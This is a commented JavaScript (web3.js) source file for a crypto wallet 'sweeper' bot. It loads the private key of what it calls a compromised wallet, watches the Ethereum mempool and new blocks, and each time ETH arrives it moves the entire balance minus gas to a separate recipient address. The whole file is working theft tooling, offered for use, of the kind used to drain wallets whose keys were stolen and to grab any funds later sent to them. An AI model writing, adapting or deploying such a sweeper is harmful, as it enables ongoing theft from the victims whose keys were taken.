// import the variables defined in the .env file and the web3.js library that connects to the Ethereum network
require('dotenv').config();
const Web3 = require('web3');
// ------------------------------ //

// defines the wallet that will receive the ETH (recipient_address) and the Private Key of the compromised wallet (WALLET_KEY)
const recipient_address = 'Recipient Address';
const wallet = process.env.WALLET_KEY;
// ------------------------------ //

// connects to the Ethereum network through the infura API
const web3 = new Web3(`wss://goerli.infura.io/ws/v3/${process.env.YOUR_API_KEY}`);
// ------------------------------ //

// gets the address of the compromised wallet through the Private Key and displays it in the terminal
const privateKey = wallet;
const account = web3.eth.accounts.privateKeyToAccount(privateKey);
console.log(`Connected to compromised wallet: ${account.address}`);
// ------------------------------ //

// Store the pending transaction hash
let pendingTransactionHash = null;

// displays the balance of the wallet, if it is equal to 0 it will show in the terminal that the wallet is empty
async function MempoolScanner() {
  const balance = await web3.eth.getBalance(account.address);
  console.log('Current balance:', web3.utils.fromWei(balance, 'ether'), 'ETH');

  if (balance === "0") {
    console.log("The account balance is zero.");
    return;
  }

  // get the gas fee price from the network
  const gasPrice = await web3.eth.getGasPrice();

  // set the gas limit
  const gasLimit = 21000;

  // calculates the maximum amount to send
  const maxAmountToSend = balance - (gasPrice * gasLimit);

  // if the gas fee value exceeds the balance value, the terminal will show that the balance is insufficient and will continue scanning the mempool
  if (maxAmountToSend <= 0) {
    console.log("Insufficient funds for gas fee.");
    return;
  }

  // this block of code represents the transaction of the entire ETH balance to the recipient's wallet
  const tx = {
    from: account.address,
    to: recipient_address,
    gas: gasLimit,
    gasPrice: gasPrice,
    value: maxAmountToSend,
    nonce: await web3.eth.getTransactionCount(account.address, 'pending'),
    chainId: 5
  };


// sign the transaction with private key and send the signed transaction
  try {
    const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log('Transaction processed in block number:', receipt.blockNumber);
    console.log('Transaction hash:', receipt.transactionHash);
  } catch (error) {
    console.log('Error occurred during transaction:', error);
  }
}

// identifies transactions in the mempool directed to the compromised wallet and stores the transaction hash to await transfer validation
web3.eth.subscribe('pendingTransactions', async (error, txHash) => {
  if (error) {
    console.error(error);
  } else {
    const tx = await web3.eth.getTransaction(txHash);
    if (tx && tx.to && tx.to.toLowerCase() === account.address.toLowerCase()) {
      console.log('Incoming transaction detected. Initiating transfer...');
      pendingTransactionHash = txHash;
    }
  }
});

// indicates that the pending transaction has been confirmed and initiates a transaction for the Recipient wallet
web3.eth.subscribe('confirmation', (confirmationNumber, receipt) => {
  if (receipt.transactionHash === pendingTransactionHash && confirmationNumber >= 1) {
    console.log('Incoming transaction confirmed. Initiating transfer...');
    MempoolScanner()

    // Clear the pending transaction hash
    pendingTransactionHash = null;
  }
});

web3.eth.subscribe('newBlockHeaders')
  .on('data', () => {

    // The script also keeps checking for new blocks to update the wallet state
    MempoolScanner()

  })
  .on('error', (error) => {
    console.error(error);
  });
